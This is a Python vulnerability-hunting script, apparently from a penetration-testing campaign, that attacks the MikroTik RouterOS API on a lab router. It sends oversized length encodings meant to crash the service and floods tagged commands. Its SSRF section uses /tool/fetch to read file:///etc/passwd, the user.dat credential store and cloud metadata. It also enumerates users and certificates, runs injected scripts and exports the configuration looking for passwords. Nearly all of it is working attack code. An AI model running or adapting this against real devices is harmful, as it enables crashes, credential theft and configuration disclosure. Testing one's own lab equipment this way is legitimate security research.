#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — Deep RouterOS API Novel Finding Hunter
Phase 9, Script 4 of 6
Target: [REDACTED-INTERNAL-IP]:8728

Tests (~100):
  1. Word encoding integer overflow (~30)
  2. Tag collision (~20)
  3. Concurrent state machine (~25)
  4. Cross-service pivoting (~25)

Evidence: evidence/novel_api_deep.json
"""

import hashlib
import json
import os
import socket
import struct
import sys
import threading
import time
import traceback
import warnings

warnings.filterwarnings("ignore")

sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import *

ec = EvidenceCollector("novel_api_deep.py", phase=9)

API_PORT = 8728


# ── RouterOS API Protocol Helpers ────────────────────────────────────────────

def api_encode_length(length):
    """Encode a RouterOS API word length.

    Length encoding:
      0x00-0x7F:       1 byte
      0x80-0x3FFF:     2 bytes (0x80 | high, low)
      0x4000-0x1FFFFF: 3 bytes (0xC0 | high, mid, low)
      0x200000-0xFFFFFFF: 4 bytes (0xE0 | ...)
      0x10000000+:     5 bytes (0xF0 + 4 bytes)
    """
    if length < 0x80:
        return bytes([length])
    elif length < 0x4000:
        return bytes([0x80 | (length >> 8), length & 0xFF])
    elif length < 0x200000:
        return bytes([0xC0 | (length >> 16),
                      (length >> 8) & 0xFF,
                      length & 0xFF])
    elif length < 0x10000000:
        return bytes([0xE0 | (length >> 24),
                      (length >> 16) & 0xFF,
                      (length >> 8) & 0xFF,
                      length & 0xFF])
    else:
        return bytes([0xF0,
                      (length >> 24) & 0xFF,
                      (length >> 16) & 0xFF,
                      (length >> 8) & 0xFF,
                      length & 0xFF])


def api_encode_word(word):
    """Encode a single RouterOS API word (length-prefixed string)."""
    if isinstance(word, str):
        word = word.encode('utf-8')
    return api_encode_length(len(word)) + word


def api_encode_sentence(words):
    """Encode a complete RouterOS API sentence (list of words + terminator)."""
    data = b""
    for word in words:
        data += api_encode_word(word)
    data += b"\x00"  # sentence terminator
    return data


def api_decode_length(sock):
    """Read and decode a RouterOS API word length from socket."""
    b = sock.recv(1)
    if not b:
        return -1
    first = b[0]

    if first < 0x80:
        return first
    elif first < 0xC0:
        second = sock.recv(1)
        if not second:
            return -1
        return ((first & 0x3F) << 8) | second[0]
    elif first < 0xE0:
        rest = sock.recv(2)
        if len(rest) < 2:
            return -1
        return ((first & 0x1F) << 16) | (rest[0] << 8) | rest[1]
    elif first < 0xF0:
        rest = sock.recv(3)
        if len(rest) < 3:
            return -1
        return ((first & 0x0F) << 24) | (rest[0] << 16) | (rest[1] << 8) | rest[2]
    else:
        rest = sock.recv(4)
        if len(rest) < 4:
            return -1
        return (rest[0] << 24) | (rest[1] << 16) | (rest[2] << 8) | rest[3]


def api_read_sentence(sock, timeout=5):
    """Read a complete RouterOS API sentence from socket.
    Returns list of word strings, or None on error/timeout."""
    sock.settimeout(timeout)
    words = []
    try:
        while True:
            length = api_decode_length(sock)
            if length < 0:
                return None
            if length == 0:
                break  # End of sentence
            word = b""
            while len(word) < length:
                chunk = sock.recv(length - len(word))
                if not chunk:
                    return None
                word += chunk
            words.append(word.decode('utf-8', errors='replace'))
    except socket.timeout:
        return words if words else None
    except Exception:
        return None
    return words


def api_connect(timeout=5):
    """Open TCP connection to RouterOS API port."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((TARGET, API_PORT))
    return s


def api_login(sock, user=None, password=None):
    """Authenticate to the RouterOS API. Returns True on success."""
    user = user or ADMIN_USER
    password = password or ADMIN_PASS

    # Send /login command
    sentence = api_encode_sentence([
        "/login",
        f"=name={user}",
        f"=password={password}",
    ])
    sock.sendall(sentence)

    # Read response
    resp = api_read_sentence(sock)
    if resp and resp[0] == "!done":
        return True
    return False


def api_send_and_read(sock, words, timeout=5):
    """Send a sentence and read the response sentence."""
    sentence = api_encode_sentence(words)
    sock.sendall(sentence)
    return api_read_sentence(sock, timeout=timeout)


def periodic_health(test_count):
    """Check router health every 10 tests."""
    if test_count % 10 == 0 and test_count > 0:
        h = check_router_alive()
        if not h.get("alive"):
            log("  Router unreachable! Waiting for recovery...")
            wait_for_router(max_wait=60)
            return False
    return True


# =============================================================================
# Section 1: Word Encoding Integer Overflow (~30 tests)
# =============================================================================

def test_word_encoding_overflow():
    """Test word length encoding with overflow values."""
    log("=" * 60)
    log("Section 1: Word Encoding Integer Overflow")
    log("=" * 60)

    test_count = 0

    # Test crafted length values that could cause integer overflow
    overflow_tests = [
        # Name, raw bytes representing the "sentence"
        ("length_0x7F_max_1byte", bytes([0x7F]) + b"A" * 0x7F + b"\x00"),
        ("length_0x80_min_2byte", bytes([0x80, 0x80]) + b"A" * 0x80 + b"\x00"),
        ("length_0x3FFF_max_2byte", bytes([0xBF, 0xFF]) + b"A" * 0x3FFF + b"\x00"),
        ("length_0xC0_min_3byte", bytes([0xC0, 0x40, 0x00]) + b"A" * 0x4000 + b"\x00"),

        # Overflow-prone values
        ("length_0x7FFFFFFF", bytes([0xF0, 0x7F, 0xFF, 0xFF, 0xFF]),
         "Send length claiming 2GB word"),
        ("length_0x80000000", bytes([0xF0, 0x80, 0x00, 0x00, 0x00]),
         "Send length with sign bit set (negative in signed)"),
        ("length_0xFFFFFFFF", bytes([0xF0, 0xFF, 0xFF, 0xFF, 0xFF]),
         "Send length of 4GB (max u32)"),
        ("length_0x00000000_5byte", bytes([0xF0, 0x00, 0x00, 0x00, 0x00]),
         "5-byte encoding of zero length"),

        # Inconsistent encoding (use 2-byte encoding for a value that fits in 1 byte)
        ("overlong_encoding_1", bytes([0x80, 0x01]) + b"A" + b"\x00",
         "2-byte encoding for length 1"),
        ("overlong_encoding_2", bytes([0xC0, 0x00, 0x01]) + b"A" + b"\x00",
         "3-byte encoding for length 1"),
    ]

    for test_name, raw_data, *desc_opt in overflow_tests:
        test_count += 1
        periodic_health(test_count)

        desc = desc_opt[0] if desc_opt else f"Send word with {test_name} encoding"

        try:
            s = api_connect(timeout=5)

            # For very large length values, we only send the header, not the full data
            if len(raw_data) > 50000:
                # Just send the length prefix and a small amount of data
                s.sendall(raw_data[:10])
            else:
                s.sendall(raw_data)

            time.sleep(0.5)

            # Try to read response
            try:
                resp_data = s.recv(4096)
                ec.add_test(
                    "word_overflow", f"Overflow: {test_name}",
                    desc,
                    f"Response: {len(resp_data)} bytes",
                    {"test": test_name, "sent_hex": raw_data[:20].hex(),
                     "response_hex": resp_data.hex()[:200] if resp_data else "",
                     "response_size": len(resp_data)},
                )
            except socket.timeout:
                ec.add_test(
                    "word_overflow", f"Overflow: {test_name}",
                    desc, "No response (timeout — server may be waiting for more data)",
                    {"test": test_name},
                )

            s.close()

        except ConnectionResetError:
            ec.add_test(
                "word_overflow", f"Overflow: {test_name}",
                desc, "Connection reset by server",
                {"test": test_name},
            )
        except Exception as e:
            ec.add_test(
                "word_overflow", f"Overflow: {test_name}",
                desc, f"Error: {e}",
            )

        # Check for crash after dangerous tests
        if "0xFFFFFFFF" in test_name or "0x7FFFFFFF" in test_name or "0x80000000" in test_name:
            h = check_router_alive()
            if not h.get("alive"):
                ec.add_finding(
                    "CRITICAL",
                    f"RouterOS API crash on {test_name}",
                    f"Sending word with {test_name} length encoding caused crash",
                    cwe="CWE-190", cvss=9.8,
                )
                wait_for_router(max_wait=60)

        time.sleep(0.1)

    # ── 1b: Authenticated overflow tests ─────────────────────────────────────
    log("  Testing overflow after authentication...")
    auth_overflow_tests = [
        # Send legitimate login first, then overflow
        ("post_auth_huge_word", "Send 100KB word after auth"),
        ("post_auth_zero_term_flood", "Send 1000 zero-length words"),
        ("post_auth_nested_sentences", "Send malformed nested sentences"),
    ]

    for test_name, desc in auth_overflow_tests:
        test_count += 1
        periodic_health(test_count)

        try:
            s = api_connect(timeout=5)
            if not api_login(s):
                ec.add_test("word_overflow", f"Auth overflow: {test_name}",
                            desc, "Login failed — cannot test post-auth",
                            anomaly=True)
                s.close()
                continue

            if "huge_word" in test_name:
                # Send a legitimate command but with a very long attribute
                long_val = "A" * 100000
                sentence = api_encode_sentence([
                    "/system/identity/print",
                    f"=.proplist={long_val}",
                ])
                s.sendall(sentence)
            elif "zero_term" in test_name:
                # Send 1000 zero-length sentence terminators
                s.sendall(b"\x00" * 1000)
            elif "nested" in test_name:
                # Send sentences within sentences (malformed)
                inner = api_encode_sentence(["/system/resource/print"])
                outer = api_encode_sentence([
                    "/system/identity/print",
                    "=" + inner.decode('utf-8', errors='replace'),
                ])
                s.sendall(outer)

            time.sleep(0.5)
            resp = api_read_sentence(s, timeout=3)
            ec.add_test(
                "word_overflow", f"Auth overflow: {test_name}",
                desc,
                f"Response: {resp}",
                {"test": test_name, "response": resp},
            )
            s.close()

        except Exception as e:
            ec.add_test("word_overflow", f"Auth overflow: {test_name}",
                        desc, f"Error: {e}")


# =============================================================================
# Section 2: Tag Collision (~20 tests)
# =============================================================================

def test_tag_collision():
    """Test RouterOS API tag multiplexing edge cases."""
    log("=" * 60)
    log("Section 2: Tag Collision")
    log("=" * 60)

    test_count = 0

    try:
        s = api_connect(timeout=5)
        if not api_login(s):
            ec.add_test("tag_collision", "Login for tag tests",
                        "Authenticate for tag collision testing",
                        "Login failed", anomaly=True)
            return
    except Exception as e:
        ec.add_test("tag_collision", "Connect for tag tests",
                    "Connect and authenticate", f"Error: {e}", anomaly=True)
        return

    ec.add_test("tag_collision", "Auth for tag tests",
                "Authenticate to RouterOS API", "Login successful")

    # ── 2a: Conflicting tags ─────────────────────────────────────────────────
    tag_tests = [
        ("tag_0", "0", "Tag value zero"),
        ("tag_1", "1", "Tag value one"),
        ("tag_negative_1", "-1", "Negative tag value"),
        ("tag_max_int", "2147483647", "Max signed 32-bit integer"),
        ("tag_max_uint", "4294967295", "Max unsigned 32-bit integer"),
        ("tag_large", "99999999999999999", "Very large tag value"),
        ("tag_string", "hello", "Non-numeric tag value"),
        ("tag_empty", "", "Empty tag value"),
        ("tag_special", "<>&\"'", "Special characters in tag"),
        ("tag_null", "\x00", "Null byte in tag"),
    ]

    for test_name, tag_value, desc in tag_tests:
        test_count += 1
        periodic_health(test_count)

        try:
            sentence = api_encode_sentence([
                "/system/identity/print",
                f".tag={tag_value}",
            ])
            s.sendall(sentence)
            resp = api_read_sentence(s, timeout=3)

            # Check if the tag is echoed back correctly
            tag_echoed = any(f".tag={tag_value}" in word for word in (resp or []))

            ec.add_test(
                "tag_collision", f"Tag: {test_name}",
                f"Send command with {desc}",
                f"Response: {resp}, tag_echoed={tag_echoed}",
                {"test": test_name, "tag_value": repr(tag_value),
                 "response": resp, "tag_echoed": tag_echoed},
            )

        except Exception as e:
            ec.add_test("tag_collision", f"Tag: {test_name}",
                        f"Tag test: {desc}", f"Error: {e}")

    # ── 2b: Duplicate tags on same connection ────────────────────────────────
    log("  Testing duplicate tags on same connection...")
    test_count += 1
    try:
        # Send two commands with the same tag simultaneously
        cmd1 = api_encode_sentence([
            "/system/identity/print",
            ".tag=DUPE",
        ])
        cmd2 = api_encode_sentence([
            "/system/resource/print",
            ".tag=DUPE",
        ])

        s.sendall(cmd1 + cmd2)  # Send both at once

        # Read two responses
        resp1 = api_read_sentence(s, timeout=3)
        resp2 = api_read_sentence(s, timeout=3)

        ec.add_test(
            "tag_collision", "Duplicate tag (same connection)",
            "Send two commands with identical tag 'DUPE' on same connection",
            f"Response 1: {resp1}, Response 2: {resp2}",
            {"response_1": resp1, "response_2": resp2},
            anomaly=(resp1 == resp2 and resp1 is not None),
        )
    except Exception as e:
        ec.add_test("tag_collision", "Duplicate tag",
                    "Duplicate tag test", f"Error: {e}")

    # ── 2c: Tag reuse after completion ───────────────────────────────────────
    log("  Testing tag reuse after command completion...")
    test_count += 1
    try:
        # Send command with tag, wait for response, reuse tag
        cmd1 = api_encode_sentence(["/system/identity/print", ".tag=REUSE"])
        s.sendall(cmd1)
        resp1 = api_read_sentence(s, timeout=3)

        cmd2 = api_encode_sentence(["/system/resource/print", ".tag=REUSE"])
        s.sendall(cmd2)
        resp2 = api_read_sentence(s, timeout=3)

        ec.add_test(
            "tag_collision", "Tag reuse after completion",
            "Reuse tag 'REUSE' for a second command after first completes",
            f"Response 1: {resp1}, Response 2: {resp2}",
            {"response_1": resp1, "response_2": resp2},
        )
    except Exception as e:
        ec.add_test("tag_collision", "Tag reuse",
                    "Tag reuse test", f"Error: {e}")

    # ── 2d: Rapid tag flooding ───────────────────────────────────────────────
    log("  Testing rapid tag flooding (100 commands)...")
    test_count += 1
    try:
        flood_data = b""
        for i in range(100):
            flood_data += api_encode_sentence([
                "/system/identity/print",
                f".tag=FLOOD_{i}",
            ])
        s.sendall(flood_data)

        # Try to read responses
        flood_responses = 0
        for _ in range(100):
            resp = api_read_sentence(s, timeout=1)
            if resp:
                flood_responses += 1
            else:
                break

        ec.add_test(
            "tag_collision", "Tag flooding (100 commands)",
            "Send 100 tagged commands rapidly on same connection",
            f"Received {flood_responses} responses",
            {"commands_sent": 100, "responses_received": flood_responses},
            anomaly=(flood_responses < 50),
        )
    except Exception as e:
        ec.add_test("tag_collision", "Tag flooding",
                    "Tag flooding test", f"Error: {e}")

    try:
        s.close()
    except Exception:
        pass


# =============================================================================
# Section 3: Concurrent State Machine (~25 tests)
# =============================================================================

def test_concurrent_state():
    """Test for state leaks between concurrent API connections."""
    log("=" * 60)
    log("Section 3: Concurrent State Machine")
    log("=" * 60)

    test_count = 0

    # ── 3a: Open 5 authenticated connections ─────────────────────────────────
    log("  Opening 5 authenticated connections...")
    connections = []
    for i in range(5):
        test_count += 1
        try:
            s = api_connect(timeout=5)
            success = api_login(s)
            if success:
                connections.append({"socket": s, "id": i, "authenticated": True})
            else:
                connections.append({"socket": s, "id": i, "authenticated": False})
                s.close()
        except Exception as e:
            connections.append({"socket": None, "id": i, "error": str(e)})

    auth_count = sum(1 for c in connections if c.get("authenticated"))
    ec.add_test(
        "concurrent_state", "Open 5 authenticated connections",
        "Open and authenticate 5 simultaneous API connections",
        f"Authenticated: {auth_count}/5",
        {"total": 5, "authenticated": auth_count},
    )

    if auth_count < 2:
        log("  Not enough connections for concurrent tests. Skipping.")
        for c in connections:
            if c.get("socket"):
                try:
                    c["socket"].close()
                except Exception:
                    pass
        return

    # ── 3b: Interleaved commands ─────────────────────────────────────────────
    log("  Testing interleaved commands across connections...")
    active = [c for c in connections if c.get("authenticated")]

    # Send different commands on different connections simultaneously
    interleave_results = []
    commands = [
        "/system/identity/print",
        "/system/resource/print",
        "/ip/address/print",
        "/interface/print",
        "/log/print",
    ]

    for i, conn in enumerate(active):
        test_count += 1
        cmd = commands[i % len(commands)]
        try:
            sentence = api_encode_sentence([cmd])
            conn["socket"].sendall(sentence)
        except Exception as e:
            interleave_results.append({"conn": i, "cmd": cmd, "error": str(e)})

    time.sleep(0.5)

    for i, conn in enumerate(active):
        cmd = commands[i % len(commands)]
        try:
            resp = api_read_sentence(conn["socket"], timeout=3)
            interleave_results.append({
                "conn": i, "cmd": cmd,
                "response": resp[:5] if resp else None,
                "response_words": len(resp) if resp else 0,
            })
        except Exception as e:
            interleave_results.append({"conn": i, "cmd": cmd, "error": str(e)})

    ec.add_test(
        "concurrent_state", "Interleaved commands",
        "Send different commands on different connections simultaneously",
        f"Completed {len(interleave_results)} command/response cycles",
        {"results": interleave_results},
    )

    # ── 3c: Partial sentence on one connection ───────────────────────────────
    log("  Testing partial sentence interference...")
    test_count += 1
    if len(active) >= 2:
        try:
            # Send partial sentence on connection 0
            partial = api_encode_word("/system/identity/print")
            # Don't send the terminator
            active[0]["socket"].sendall(partial)

            # Send complete command on connection 1
            complete = api_encode_sentence(["/system/resource/print"])
            active[1]["socket"].sendall(complete)

            # Read from connection 1 (should work normally)
            resp1 = api_read_sentence(active[1]["socket"], timeout=3)

            # Now complete the sentence on connection 0
            active[0]["socket"].sendall(b"\x00")  # sentence terminator

            resp0 = api_read_sentence(active[0]["socket"], timeout=3)

            ec.add_test(
                "concurrent_state", "Partial sentence interference",
                "Send partial sentence on conn0, complete cmd on conn1, verify isolation",
                f"Conn0 response: {resp0}, Conn1 response: {resp1}",
                {"conn0_response": resp0, "conn1_response": resp1,
                 "isolated": resp1 is not None},
            )

        except Exception as e:
            ec.add_test("concurrent_state", "Partial sentence interference",
                        "Partial sentence test", f"Error: {e}")

    # ── 3d: State leak test ──────────────────────────────────────────────────
    log("  Testing state leak between connections...")
    test_count += 1
    if len(active) >= 2:
        try:
            # Set identity on connection 0
            set_cmd = api_encode_sentence([
                "/system/identity/set",
                "=name=StateLeakTest",
            ])
            active[0]["socket"].sendall(set_cmd)
            set_resp = api_read_sentence(active[0]["socket"], timeout=3)

            # Read identity on connection 1 — should see the change
            get_cmd = api_encode_sentence(["/system/identity/print"])
            active[1]["socket"].sendall(get_cmd)
            get_resp = api_read_sentence(active[1]["socket"], timeout=3)

            # Check if conn1 sees the change
            identity_visible = any("StateLeakTest" in word for word in (get_resp or []))

            ec.add_test(
                "concurrent_state", "Cross-connection state visibility",
                "Set identity on conn0, read on conn1",
                f"Change visible on conn1: {identity_visible}",
                {"set_response": set_resp, "get_response": get_resp,
                 "cross_visible": identity_visible},
            )

            # Restore identity
            restore = api_encode_sentence([
                "/system/identity/set",
                "=name=MikroTik",
            ])
            active[0]["socket"].sendall(restore)
            api_read_sentence(active[0]["socket"], timeout=3)

        except Exception as e:
            ec.add_test("concurrent_state", "State leak test",
                        "Cross-connection state test", f"Error: {e}")

    # ── 3e: Race condition — simultaneous writes ─────────────────────────────
    log("  Testing race condition with simultaneous writes...")
    test_count += 1
    if len(active) >= 2:
        results = [None, None]
        errors = [None, None]

        def write_identity(conn_idx, name_val):
            try:
                sentence = api_encode_sentence([
                    "/system/identity/set",
                    f"=name={name_val}",
                ])
                active[conn_idx]["socket"].sendall(sentence)
                resp = api_read_sentence(active[conn_idx]["socket"], timeout=3)
                results[conn_idx] = resp
            except Exception as e:
                errors[conn_idx] = str(e)

        t0 = threading.Thread(target=write_identity, args=(0, "RaceA"))
        t1 = threading.Thread(target=write_identity, args=(1, "RaceB"))
        t0.start()
        t1.start()
        t0.join(timeout=5)
        t1.join(timeout=5)

        # Check which value won
        time.sleep(0.3)
        code, data = rest_get("/system/identity")
        final_name = data.get("name", "") if isinstance(data, dict) else ""

        ec.add_test(
            "concurrent_state", "Race condition (simultaneous identity set)",
            "Two connections set identity to different values simultaneously",
            f"Result: '{final_name}' (responses: {results})",
            {"conn0_response": results[0], "conn1_response": results[1],
             "errors": errors, "final_identity": final_name},
        )

        # Restore
        rest_post("/system/identity/set", {"name": "MikroTik"})

    # Cleanup connections
    for c in connections:
        if c.get("socket"):
            try:
                c["socket"].close()
            except Exception:
                pass


# =============================================================================
# Section 4: Cross-Service Pivoting (~25 tests)
# =============================================================================

def test_cross_service_pivot():
    """Test using API to interact with other services on the router."""
    log("=" * 60)
    log("Section 4: Cross-Service Pivoting via API")
    log("=" * 60)

    test_count = 0

    try:
        s = api_connect(timeout=5)
        if not api_login(s):
            ec.add_test("cross_pivot", "Login for pivot tests",
                        "Authenticate for cross-service testing",
                        "Login failed", anomaly=True)
            return
    except Exception as e:
        ec.add_test("cross_pivot", "Connect for pivot tests",
                    "Connect and authenticate", f"Error: {e}", anomaly=True)
        return

    # ── 4a: SSRF via /tool/fetch ─────────────────────────────────────────────
    log("  Testing SSRF via API /tool/fetch...")
    fetch_urls = [
        ("loopback_self", "http://127.0.0.1/rest/system/resource"),
        ("loopback_winbox", "http://127.0.0.1:8291/"),
        ("loopback_api", "http://127.0.0.1:8728/"),
        ("file_proto", "file:///etc/passwd"),
        ("file_userdat", "file:///rw/store/user.dat"),
        ("metadata", "http://[REDACTED-IP]/latest/meta-data/"),
        ("ipv6_loop", "http://[::1]/"),
    ]

    for name, url in fetch_urls:
        test_count += 1
        periodic_health(test_count)

        try:
            sentence = api_encode_sentence([
                "/tool/fetch",
                f"=url={url}",
                "=mode=http",
                "=as-value=",
                "=.proplist=status,data,downloaded",
            ])
            s.sendall(sentence)
            resp = api_read_sentence(s, timeout=10)

            resp_str = str(resp)
            has_content = any(kw in resp_str.lower()
                             for kw in ["data", "root:", "user.dat", "ami-id", "downloaded"])

            ec.add_test(
                "cross_pivot", f"API fetch SSRF: {name}",
                f"Use /tool/fetch via API to access {url[:60]}",
                f"Response: {resp_str[:300]}",
                {"name": name, "url": url, "response": resp,
                 "has_content": has_content},
                anomaly=has_content and ("file" in name or "metadata" in name),
            )

            if has_content and "file" in name:
                ec.add_finding(
                    "HIGH",
                    f"API SSRF via /tool/fetch — {name}",
                    f"API /tool/fetch accessed {url} and returned content",
                    cwe="CWE-918",
                )

        except Exception as e:
            ec.add_test("cross_pivot", f"API fetch SSRF: {name}",
                        f"SSRF test via API", f"Error: {e}")

    # ── 4b: Execute system commands ──────────────────────────────────────────
    log("  Testing command execution via API...")
    exec_commands = [
        ("/system/identity/print", "Read system identity"),
        ("/user/print", "List users"),
        ("/file/print", "List files"),
        ("/system/resource/print", "Read system resources"),
        ("/ip/service/print", "List IP services"),
        ("/system/package/print", "List packages"),
        ("/system/history/print", "Read command history"),
        ("/log/print", "Read system log"),
        ("/ip/dns/print", "Read DNS config"),
        ("/certificate/print", "List certificates"),
    ]

    for cmd, desc in exec_commands:
        test_count += 1
        periodic_health(test_count)

        try:
            sentence = api_encode_sentence([cmd])
            s.sendall(sentence)

            # Read all response sentences until !done
            all_words = []
            for _ in range(100):
                resp = api_read_sentence(s, timeout=3)
                if not resp:
                    break
                all_words.extend(resp)
                if "!done" in resp:
                    break

            ec.add_test(
                "cross_pivot", f"API exec: {cmd}",
                f"Execute {desc} via API",
                f"Response: {len(all_words)} words",
                {"command": cmd, "description": desc,
                 "word_count": len(all_words),
                 "preview": all_words[:20]},
            )

        except Exception as e:
            ec.add_test("cross_pivot", f"API exec: {cmd}",
                        f"API command execution", f"Error: {e}")

    # ── 4c: DNS cache interaction ────────────────────────────────────────────
    test_count += 1
    try:
        sentence = api_encode_sentence(["/ip/dns/cache/print"])
        s.sendall(sentence)
        resp = api_read_sentence(s, timeout=3)
        ec.add_test(
            "cross_pivot", "DNS cache dump via API",
            "Read DNS cache via API (information disclosure)",
            f"Response: {resp}",
            {"response": resp},
        )
    except Exception as e:
        ec.add_test("cross_pivot", "DNS cache dump",
                    "DNS cache test", f"Error: {e}")

    # ── 4d: Script execution via API ─────────────────────────────────────────
    log("  Testing script execution via API...")
    test_count += 1
    try:
        # Create a test script
        sentence = api_encode_sentence([
            "/system/script/add",
            "=name=_api_pivot_test",
            '=source=:put [/system/resource get cpu-load]',
        ])
        s.sendall(sentence)
        create_resp = api_read_sentence(s, timeout=3)

        # Run it
        sentence = api_encode_sentence([
            "/system/script/run",
            "=number=_api_pivot_test",
        ])
        s.sendall(sentence)
        run_resp = api_read_sentence(s, timeout=5)

        ec.add_test(
            "cross_pivot", "Script create+execute via API",
            "Create and execute a RouterOS script via API",
            f"Create: {create_resp}, Run: {run_resp}",
            {"create_response": create_resp, "run_response": run_resp},
        )

        # Cleanup
        sentence = api_encode_sentence([
            "/system/script/remove",
            "=numbers=_api_pivot_test",
        ])
        s.sendall(sentence)
        api_read_sentence(s, timeout=3)

    except Exception as e:
        ec.add_test("cross_pivot", "Script execution via API",
                    "API script test", f"Error: {e}")

    # ── 4e: Export configuration via API ──────────────────────────────────────
    test_count += 1
    try:
        sentence = api_encode_sentence(["/export"])
        s.sendall(sentence)
        export_resp = api_read_sentence(s, timeout=5)

        has_passwords = any("password" in str(word).lower()
                           for word in (export_resp or []))

        ec.add_test(
            "cross_pivot", "Config export via API",
            "Export full configuration via API",
            f"Response words: {len(export_resp or [])}, has_passwords: {has_passwords}",
            {"response_preview": (export_resp or [])[:10],
             "has_passwords": has_passwords},
            anomaly=has_passwords,
        )
    except Exception as e:
        ec.add_test("cross_pivot", "Config export via API",
                    "API export test", f"Error: {e}")

    try:
        s.close()
    except Exception:
        pass


# =============================================================================
# Main
# =============================================================================

def main():
    log("=" * 60)
    log("MikroTik RouterOS CHR 7.20.8 — Deep RouterOS API Hunting")
    log(f"Target: {TARGET}:{API_PORT}")
    log("Phase 9 — novel_api_deep.py")
    log("=" * 60)

    alive = check_router_alive()
    if not alive.get("alive"):
        log("FATAL: Router is not responding. Aborting.")
        return
    log(f"Router alive: version={alive.get('version')}, uptime={alive.get('uptime')}")

    # Verify API port is open
    try:
        s = api_connect(timeout=3)
        s.close()
        log(f"API port {API_PORT} is open.")
    except Exception as e:
        log(f"WARNING: API port {API_PORT} not reachable: {e}")
        log("Continuing anyway — some tests may fail.")

    try:
        test_word_encoding_overflow()  # ~30 tests
        test_tag_collision()           # ~20 tests
        test_concurrent_state()        # ~25 tests
        test_cross_service_pivot()     # ~25 tests

    except KeyboardInterrupt:
        log("Interrupted by user.")
    except Exception as e:
        log(f"Unhandled exception: {e}")
        traceback.print_exc()
    finally:
        # Restore identity if changed
        rest_post("/system/identity/set", {"name": "MikroTik"})

        final = check_router_alive()
        log(f"Final health: {final}")

        ec.save("novel_api_deep.json")
        ec.summary()


if __name__ == "__main__":
    os.chdir("/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik")
    main()
